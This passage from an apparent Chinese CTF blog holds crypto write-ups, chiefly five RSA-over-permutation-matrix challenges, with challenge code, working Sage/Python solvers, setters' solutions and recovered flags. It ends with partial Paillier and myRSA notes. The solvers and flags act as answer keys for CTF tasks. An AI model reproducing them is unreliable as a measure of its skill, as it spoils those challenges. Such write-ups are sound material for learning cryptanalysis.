right)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        signal.alarm(<span class="number">200</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof_of_work():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        key = os.urandom(<span class="number">8</span>)</span><br><span class="line">        self.dosend(<span class="string">&#x27;Encrypted flag is:&#x27;</span>)</span><br><span class="line">        self.dosend(self.encrypt_ecb(flag,key)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        self.dosend(<span class="string">&#x27;Here is your chance:&#x27;</span>)</span><br><span class="line">        data = self.dorecv(<span class="number">160</span>)</span><br><span class="line">        self.dosend(self.encrypt_ecb(data,key))</span><br><span class="line"></span><br><span class="line">        self.request.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ForkingServer</span>(SocketServer.ForkingTCPServer, SocketServer.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10005</span></span><br><span class="line">    server = ForkingServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>randcrack</tag>
        <tag>coppersmith</tag>
        <tag>Tea</tag>
        <tag>Feistel</tag>
        <tag>Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>吃瓜杯</title>
    <url>/2021/08/19/2021/%E5%90%83%E7%93%9C%E6%9D%AF/</url>
    <content><![CDATA[<p>做了下闪电五连鞭，题出的很有意思，春哥从国外比赛扒的题（<a href="https://github.com/BCACTF/bcactf-2.0">BCACTF</a>）,难度不大，结合了RSA和相似矩阵</p>
<span id="more"></span>
<h1 id="题目描述">题目描述</h1>
<blockquote>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">朋友们好。</span><br><span class="line"></span><br><span class="line">今天，和大家，探讨一下，怎样打RSA置换闪电鞭。</span><br><span class="line"></span><br><span class="line">要做到三点。</span><br><span class="line"></span><br><span class="line">一：要做到问题真正的放松。但是线性代数基本知识要用好。这里面，该松的松，该紧的紧。松中有紧，紧中有松。这个问题非常复杂，在这里不多说。在问题的描述中有详细的解释；</span><br><span class="line"></span><br><span class="line">二：要练好内功，你才能代码中发力，打出RSA置换劲儿。慢练，这是签到的……快练！下合上开，上合下开！所以，这个RSA置换劲儿啊……这个RSA和置换都在动啊……</span><br><span class="line"></span><br><span class="line">三：要用高维的RSA置换劲儿，才能打出RSA置换闪电鞭。因为这个鞭的劲儿，你看……是不是，你看……都是高维的啊……</span><br><span class="line"></span><br><span class="line">下面我打一个连五鞭啊……打了五鞭：一鞭，两鞭，三鞭，四鞭，五鞭。这五鞭要连次打，你看：实战时间，一定要动武，全身松好，用高维的劲，RSA置换劲儿！才能打出<span class="built_in">flag</span>，打出RSA置换闪电鞭！</span><br><span class="line"></span><br><span class="line">谢谢朋友们。</span><br></pre></td></tr></table></figure>
</blockquote>
<h1 id="bian">1bian</h1>
<h2 id="题">题</h2>
<p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">n = 8870619487339789349033932217513908953609539651949986489986889710933094577873155191810742828503059670650154455297603719</span><br><span class="line">e = 3</span><br><span class="line"></span><br><span class="line">with open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;) as f:</span><br><span class="line">    m = bytes_to_long(f.read())</span><br><span class="line"></span><br><span class="line">assert n &gt; m</span><br><span class="line"></span><br><span class="line">Zn = Zmod(n)</span><br><span class="line">P = PermutationGroupElement(&#x27;(1,6)(2,3,5)(4,7)&#x27;)</span><br><span class="line">P = Matrix(Zn, P.matrix())</span><br><span class="line"></span><br><span class="line">def encrypt(m):</span><br><span class="line">    C = (m * P) ^ e</span><br><span class="line">    return C.list()</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p><span class="math display">\[
[0,
0,
0,
0,
0,
6940158573485767169443582872275118843545217792197971962103010557916847970940437712181778807436191892307187137338300231,
0,
0,
6940158573485767169443582872275118843545217792197971962103010557916847970940437712181778807436191892307187137338300231,
0,
0,
0,
0,
0,
0,
0,
6940158573485767169443582872275118843545217792197971962103010557916847970940437712181778807436191892307187137338300231,
0,
0,
0,
0,
0,
0,
0,
0,
0,
0,
6940158573485767169443582872275118843545217792197971962103010557916847970940437712181778807436191892307187137338300231,
0,
0,
0,
0,
6940158573485767169443582872275118843545217792197971962103010557916847970940437712181778807436191892307187137338300231,
0,
0,
6940158573485767169443582872275118843545217792197971962103010557916847970940437712181778807436191892307187137338300231,
0,
0,
0,
0,
0,
0,
0,
0,
0,
6940158573485767169443582872275118843545217792197971962103010557916847970940437712181778807436191892307187137338300231,
0,
0,
0]
\]</span></p>
<h2 id="解">解</h2>
<p>题目生成了一个置换群和对应的矩阵P，加密算法为 <span class="math display">\[
C=(mP)^e=m^eP^e\\
P^3同样是个置换矩阵，并且元素全为1。所以C中的元素即为c=m^3
\]</span> 又由于n易分解，所以就就化为了最简单的RSA</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">c=<span class="number">6940158573485767169443582872275118843545217792197971962103010557916847970940437712181778807436191892307187137338300231</span></span><br><span class="line">n = <span class="number">8870619487339789349033932217513908953609539651949986489986889710933094577873155191810742828503059670650154455297603719</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">a=[<span class="number">35200554341</span> , <span class="number">35592761021</span> , <span class="number">48105446183</span> , <span class="number">48479007809</span> , <span class="number">50240938337</span> , <span class="number">50769514811</span> , <span class="number">62183036099</span> , <span class="number">63345654131</span> , <span class="number">66104249843</span> , <span class="number">67515121673</span> , <span class="number">67704082961</span>]</span><br><span class="line">p=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">   p*=i-<span class="number">1</span></span><br><span class="line">d=gmpy2.invert(e,p)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"><span class="comment">#ctfshow&#123;W4r_Dull_Eeeee_LLL3333_A_n0_F14sH_@w@&#125;</span></span><br></pre></td></tr></table></figure>
<h1 id="bian-1">2bian</h1>
<h2 id="题-1">题</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">0x36D</span>)</span><br><span class="line"></span><br><span class="line">n = <span class="number">3950848271664122675439855009329233027357977239695163232943132810210035583520735079984423511153607529820284200137188647</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    m = bytes_to_long(f.read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> n &gt; m</span><br><span class="line"></span><br><span class="line">Zn = Zmod(n)</span><br><span class="line">P = PermutationGroupElement(<span class="string">&#x27;(1,14,25,8,23,15)(2,22,17)(3,18,13,33,11,30,26,27,10,6,16,31,28,21,29,36,7,9)(4,35,12,32,20,5,24)(19,34)&#x27;</span>)</span><br><span class="line">P = Matrix(Zn, P.matrix())</span><br><span class="line">A = Matrix(Zn, <span class="number">36</span>, <span class="number">36</span>, <span class="keyword">lambda</span> x, y: random.randint(<span class="number">0</span>, <span class="number">0x36D</span>))</span><br><span class="line">B = A * P * A^-<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m</span>):</span><br><span class="line">    C = (m * B) ^ e</span><br><span class="line">    <span class="keyword">return</span> C.<span class="built_in">list</span>()</span><br></pre></td></tr></table></figure>
<p><span class="math display">\[
A是一个随机矩阵，但随机数种子是确定的，所以A是确定的\\
所以B=APA^{-1}也是确定的\\
加密算法C=(mB)^e=m^eB^e\\
那么CB^{-3}的元素即为m^3\\
然后就化到了第一问上
\]</span></p>
<h2 id="解-1">解</h2>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">import</span> random</span><br><span class="line"><span class="attribute">from</span> Crypto.Util.number import *</span><br><span class="line"><span class="attribute">random</span>.seed(<span class="number">0</span>x36D)</span><br><span class="line"></span><br><span class="line"><span class="attribute">n</span> = <span class="number">3950848271664122675439855009329233027357977239695163232943132810210035583520735079984423511153607529820284200137188647</span></span><br><span class="line"><span class="attribute">e</span>=<span class="number">3</span></span><br><span class="line"><span class="attribute">Zn</span> = Zmod(n)</span><br><span class="line"><span class="attribute">P</span> = PermutationGroupElement(&#x27;(<span class="number">1</span>,<span class="number">14</span>,<span class="number">25</span>,<span class="number">8</span>,<span class="number">23</span>,<span class="number">15</span>)(<span class="number">2</span>,<span class="number">22</span>,<span class="number">17</span>)(<span class="number">3</span>,<span class="number">18</span>,<span class="number">13</span>,<span class="number">33</span>,<span class="number">11</span>,<span class="number">30</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">16</span>,<span class="number">31</span>,<span class="number">28</span>,<span class="number">21</span>,<span class="number">29</span>,<span class="number">36</span>,<span class="number">7</span>,<span class="number">9</span>)(<span class="number">4</span>,<span class="number">35</span>,<span class="number">12</span>,<span class="number">32</span>,<span class="number">20</span>,<span class="number">5</span>,<span class="number">24</span>)(<span class="number">19</span>,<span class="number">34</span>)&#x27;)</span><br><span class="line"><span class="attribute">P</span> = Matrix(Zn, P.matrix())</span><br><span class="line"><span class="attribute">A</span> = Matrix(Zn, <span class="number">36</span>, <span class="number">36</span>, lambda x, y: random.randint(<span class="number">0</span>, <span class="number">0</span>x36D))</span><br><span class="line"><span class="attribute">B</span> = A * P * A^-<span class="number">1</span></span><br><span class="line"><span class="attribute">C</span>#C太太太大了，不丢了</span><br><span class="line"><span class="attribute">c</span>=<span class="number">788338113035295195878123865420815134674503086857319693837443675089195439938279689750424184012172121716196117254817680</span></span><br><span class="line"><span class="attribute">phi</span>=euler_phi(n)</span><br><span class="line"></span><br><span class="line"><span class="attribute">d</span>=inverse_mod(e,phi)</span><br><span class="line"><span class="attribute">print</span>((C*B^-<span class="number">3</span>).trace())</span><br><span class="line"><span class="attribute">print</span>(long_to_bytes(pow(c,d,n)))</span><br></pre></td></tr></table></figure>
<h1 id="bian-2">3bian</h1>
<p>之后都变成了nc题，并且能给我条件是矩阵的迹</p>
<h2 id="题-2">题</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">0x36D</span>)</span><br><span class="line"></span><br><span class="line">n = <span class="number">25126409997644048715497037905442671105116158875704245711785280791201683049008805107543997350200944348915833337286069203</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    m = bytes_to_long(f.read())</span><br><span class="line"><span class="keyword">assert</span> n &gt; m</span><br><span class="line"></span><br><span class="line">Zn = Zmod(n)</span><br><span class="line">P = PermutationGroupElement(<span class="string">&#x27;(1,3,6,29,25,34,22,33,10,16,7)(2,21,19,17,31,9,5,30,27,35,32,11)(4,20,28,23,18,15)(8,26,14,12)(36,24,13)&#x27;</span>)</span><br><span class="line">P = Matrix(Zn, P.matrix())</span><br><span class="line">A = Matrix(Zn, <span class="number">36</span>, <span class="number">36</span>, <span class="keyword">lambda</span> x, y: random.randint(<span class="number">0</span>, <span class="number">0x36D</span>))</span><br><span class="line">B = A * P * A^-<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m</span>):</span><br><span class="line">    C = (m * B) ^ e</span><br><span class="line">    <span class="keyword">return</span> C</span><br><span class="line"></span><br><span class="line">matrix_map = &#123;<span class="string">&quot;I&quot;</span>: Matrix(Zn, matrix.identity(<span class="number">36</span>)), <span class="string">&quot;B&quot;</span>: B, <span class="string">&quot;C&quot;</span>: encrypt(m)&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server_add</span>(<span class="params">matrix_map</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;第一个矩阵：&quot;</span>)</span><br><span class="line">    A = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>).strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;第二个矩阵：&quot;</span>)</span><br><span class="line">    B = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>).strip()</span><br><span class="line">    C = matrix_map[A]+matrix_map[B]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;这两个矩阵之和的迹是：<span class="subst">&#123;C.trace()&#125;</span>，迹你实在是太美~&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> C</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server_product</span>(<span class="params">matrix_map</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;第一个矩阵：&quot;</span>)</span><br><span class="line">    A = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>).strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;第二个矩阵：&quot;</span>)</span><br><span class="line">    B = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>).strip()</span><br><span class="line">    C = matrix_map[A]*matrix_map[B]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;这两个矩阵之积的迹是：<span class="subst">&#123;C.trace()&#125;</span>，迹你实在是太美~&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> C</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server_kproduct</span>(<span class="params">matrix_map</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;矩阵：&quot;</span>)</span><br><span class="line">    A = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>).strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;乘数：&quot;</span>)</span><br><span class="line">    k = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>).strip()</span><br><span class="line">    k = <span class="built_in">int</span>(k)</span><br><span class="line">    B = k * matrix_map[A]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;数乘结果的迹是：<span class="subst">&#123;B.trace()&#125;</span>，迹你实在是太美~&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> B</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server_power</span>(<span class="params">matrix_map</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;矩阵：&quot;</span>)</span><br><span class="line">    A = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>).strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;幂次：&quot;</span>)</span><br><span class="line">    k = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>).strip()</span><br><span class="line">    k = <span class="built_in">int</span>(k)</span><br><span class="line">    B = matrix_map[A] ^ k</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;求幂结果的迹是：<span class="subst">&#123;B.trace()&#125;</span>，迹你实在是太美~&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> B</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server_save</span>(<span class="params">A, matrix_map</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;存个小档？ (Y/N)&quot;</span>)</span><br><span class="line">    s = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>).strip().upper()</span><br><span class="line">    <span class="keyword">if</span> s == <span class="string">&quot;Y&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;运算结果叫啥名呢？&quot;</span>)</span><br><span class="line">        S = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>).strip()</span><br><span class="line">        matrix_map[S] = A</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;存上档咯！&quot;</span>)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">欢迎来打第三鞭！</span></span><br><span class="line"><span class="string">在这一鞭中，你可以尝试打出两个矩阵的和，积。</span></span><br><span class="line"><span class="string">或者一个矩阵的数乘，幂次。</span></span><br><span class="line"><span class="string">但是由于av50183113，所以我只会告诉你运算结果的迹，因为迹你太美。</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">MENU = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">请开始你的表演：</span></span><br><span class="line"><span class="string">[S] 打印矩阵</span></span><br><span class="line"><span class="string">[+] 两矩阵相加</span></span><br><span class="line"><span class="string">[*] 两矩阵相乘</span></span><br><span class="line"><span class="string">[K] 一矩阵数乘</span></span><br><span class="line"><span class="string">[^] 一矩阵求幂</span></span><br><span class="line"><span class="string">[Q] 886</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(MENU)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opt = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>).strip().upper()</span><br><span class="line">        <span class="keyword">if</span> (opt == <span class="string">&quot;S&quot;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;迹你太美……baby……迹你实在是太美……&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> k, v <span class="keyword">in</span> matrix_map.items():</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;k&#125;</span>: <span class="subst">&#123;v.trace()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> (opt == <span class="string">&quot;+&quot;</span>):</span><br><span class="line">            M = server_add(matrix_map)</span><br><span class="line">            server_save(M, matrix_map)</span><br><span class="line">        <span class="keyword">elif</span> (opt == <span class="string">&quot;*&quot;</span>):</span><br><span class="line">            M = server_product(matrix_map)</span><br><span class="line">            server_save(M, matrix_map)</span><br><span class="line">        <span class="keyword">elif</span> (opt == <span class="string">&quot;K&quot;</span>):</span><br><span class="line">            M = server_kproduct(matrix_map)</span><br><span class="line">            server_save(M, matrix_map)</span><br><span class="line">        <span class="keyword">elif</span> (opt == <span class="string">&quot;^&quot;</span>):</span><br><span class="line">            M = server_power(matrix_map)</span><br><span class="line">            server_save(M, matrix_map)</span><br><span class="line">        <span class="keyword">elif</span> (opt == <span class="string">&quot;Q&quot;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;再见！&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;李在……赣神魔？&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这波和闪电鞭配合得不是很好……&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>端口那边初始储存了三个矩阵，B、C和I，I即单位矩阵，能够进行矩阵相加、相乘、数乘、求幂、展示的操作并且给出的是结果矩阵的迹，也就是对角线上元素的和</p>
<h2 id="我的解">我的解</h2>
<p>由第二问可以知道，得到的<span class="math display">\[C*B^{-3}\]</span>的是一个对角阵，而且对角线上的元素全为<span class="math display">\[m^3\]</span>，已知矩阵是36x36的大小，所以迹=36*c，然后就可以解出m了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">0x36D</span>)</span><br><span class="line"></span><br><span class="line">n = <span class="number">25126409997644048715497037905442671105116158875704245711785280791201683049008805107543997350200944348915833337286069203</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">Zn = Zmod(n)</span><br><span class="line">P = PermutationGroupElement(<span class="string">&#x27;(1,3,6,29,25,34,22,33,10,16,7)(2,21,19,17,31,9,5,30,27,35,32,11)(4,20,28,23,18,15)(8,26,14,12)(36,24,13)&#x27;</span>)</span><br><span class="line">P = Matrix(Zn, P.matrix())</span><br><span class="line">A = Matrix(Zn, <span class="number">36</span>, <span class="number">36</span>, <span class="keyword">lambda</span> x, y: random.randint(<span class="number">0</span>, <span class="number">0x36D</span>))</span><br><span class="line">B = A * P * A^-<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>((P^<span class="number">12</span>).trace())</span><br><span class="line">D=B^<span class="number">3</span></span><br><span class="line"></span><br><span class="line">c=(<span class="number">9857562962643282087288501924102632185114609865442470151120627871503036282427052725871725631485463201834546369527295236</span>*inverse_mod(<span class="number">36</span>,n))%n</span><br><span class="line">phi=euler_phi(n)</span><br><span class="line">d=inverse_mod(e,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure>
<h2 id="出题人的wp">出题人的wp</h2>
<p><img src="/images/%E5%90%83%E7%93%9C%E6%9D%AF/3bian1.png" alt="出题人想法"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># Put the trace of the cipher here</span></span><br><span class="line">tr = <span class="number">14813573939127972566346276778703360636838383920024039547829404416974023159738670520401495234532257783312488372282988720</span></span><br><span class="line"><span class="comment"># 3 * m^3</span></span><br><span class="line">n = <span class="number">25126409997644048715497037905442671105116158875704245711785280791201683049008805107543997350200944348915833337286069203</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">fac = factor(n)</span><br><span class="line">cs = []</span><br><span class="line">ns = []</span><br><span class="line"><span class="keyword">for</span> p, alpha <span class="keyword">in</span> fac:    </span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(p))   </span><br><span class="line">    f = <span class="number">3</span> * x^<span class="number">3</span> - tr    </span><br><span class="line">    cs.append(<span class="built_in">int</span>(f.roots()[<span class="number">0</span>][<span class="number">0</span>]))    </span><br><span class="line">    ns.append(p)</span><br><span class="line">m = crt(cs, ns)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p>用CRT的思想就是将一个大问题拆分成几个小问题，然后求解出更易求得的小问题，再用CRT算法求出原问题的解，学到了</p>
<h1 id="bian-3">4bian</h1>
<p>这一题e=17，每次nc后n随机给出，n还是满足易分解的特点；</p>
<p>这次没有给出矩阵B的生成方式，但是通关trace(I)=88可以判断出矩阵的阶数是88；</p>
<p>但是得到的trace(B)=trace(C)=0，测试后发现<span class="math display">\[trace(CB^{-17})!=0\]</span>，所以就转换到3bian上了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">3517510500012578106622165513758529071479627734667631280414059054641298876493975288768988113516424615888881460323558373</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line"></span><br><span class="line">c=(<span class="number">1085260800784001954133584897165283180613148497110186223344717673152088774523221770328958058661702434339964578373746248</span>*inverse_mod(<span class="number">88</span>,n))%n</span><br><span class="line">phi=euler_phi(n)</span><br><span class="line">d=inverse_mod(e,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure>
<h2 id="出题人的wp-1">出题人的WP</h2>
<p><img src="/images/%E5%90%83%E7%93%9C%E6%9D%AF/4bian-16301230564112.png" alt="4bian"></p>
<p>思路是试出使得C的迹不为0的幂次，然后使用相关明文攻击进行多项式辗转相除，构造拿到密文c。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">3525391383893454949178974275545607641708362073574956727334904966529494223283130893750994940957609615705033001171886177</span></span><br><span class="line">tr1 = <span class="number">3049270810698445654099605477449981251458767119860329568250296940497378143674701051415025737368773161813012045690902750</span></span><br><span class="line">tr2 = <span class="number">2188079608695802322451864004898125123944812594307497345389217291001509103650388567869655694926044170369531992486933204</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f1 = <span class="number">12</span> * x^<span class="number">12</span> - tr1</span><br><span class="line">f2 = <span class="number">49</span> * x^<span class="number">49</span> - tr2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compositeModulusGCD</span>(<span class="params">a, b</span>):    </span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>):        </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(-a.monic().coefficients()[<span class="number">0</span>])    </span><br><span class="line">    <span class="keyword">else</span>:        </span><br><span class="line">        <span class="keyword">return</span> compositeModulusGCD(b, a % b)</span><br><span class="line">c = compositeModulusGCD(f1, f2)</span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">d = inverse_mod(e, euler_phi(n))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h1 id="bian-4">5bian</h1>
<p>在4bian的基础上，使得每一个操作只能使用一次；</p>
<p>但是trace(C)不为0，因此找到trace(B)不为0的一组，由<span class="math display">\[trace(C)=m^etrace(B)\]</span>，直接拿到c</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">3292011909327659421775049456711303402369135799358104929999970787062175640424891481702884769338853356800690265327619267</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x1337</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#c=(1085260800784001954133584897165283180613148497110186223344717673152088774523221770328958058661702434339964578373746248*inverse_mod(88,n))%n</span></span><br><span class="line">c=<span class="number">2507485887326570401463415497945317383847101547433009173857509227786381170695740614311577886312431809984908609722898546</span></span><br><span class="line">phi=euler_phi(n)</span><br><span class="line">d=inverse_mod(e,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>matrix</tag>
      </tags>
  </entry>
  <entry>
    <title>祥云杯</title>
    <url>/2021/08/21/2021/%E7%A5%A5%E4%BA%91%E6%9D%AF/</url>
    <content><![CDATA[<p>还要再加油。</p>
<span id="more"></span>
<h1 id="guess">Guess</h1>
<p>这一题是个Paillier加密方案，加解密函数都给出了 <span class="math display">\[
c=g^mr^n\;mod\;n^2
\]</span></p>
<h2 id="同态">同态</h2>
<p>Paillier加密具有<strong>同态</strong>的性质，满足:<span class="math display">\[D(c_1c_2)=m_1+m_2\]</span>，proof： <span class="math display">\[
c_1=g^{m_1}r1^n\;mod \;n\\
c_2=g^{m_1}r2^n\;mod \;n\\
∴c_1c_2=g^{m_1m_2}(r_1r_2)^n\;mod\;n\\
即c=c_1c_2,m=m_1+m_2
\]</span> 所以<span class="math display">\[D(c^2)=2m\]</span></p>
<h2 id="流程">流程</h2>
<ol type="1">
<li>给出公钥n、g；</li>
<li>传入一个ciphertext，给出相应的plaintext；</li>
<li><span class="math display">\[传入m_1和m_2，均大于2且比特位相同，随机返回E(m_1m_2KEY_R)
or E(m_1m_2KEY_{R+1})\]</span>；</li>
<li>再传入一个ciphertext，给出相应的plaintext；</li>
<li>猜测步骤3返回的是密文所对应的明文是哪一个；</li>
<li>循环上述步骤32轮；</li>
</ol>
<h2 id="解密">解密</h2>
<p>传入<span class="math display">\[m_1和m_2\]</span>后拿到的密文记为c。在步骤5中传入<span class="math display">\[c^2\]</span>，则可获得加密明文的两倍。那么现在要解决的问题是key，这个利用LLL和BKZ算法能爆出来。</p>
<h1 id="myrsa">myRSA</h1>
<p>加密的关键代码: <span class="math display">\[
x=p^2(p+3q-1)+q^2(q+3p-1)\\
y=2pq+p+q\\
z\\
c=m^e\; mod\;n\\
∴xc+yc+z=[(p+q)^3-(p-q)^2+(p+q)]c+z\\
∵ n=pq\\
∴上式=[(p+q)^3-(p+q)^2+(p+q)+4n]c+z\\
令p+q=a\\
∴cc=(a^3-a^2+a+4n)c+z
\]</span></p>
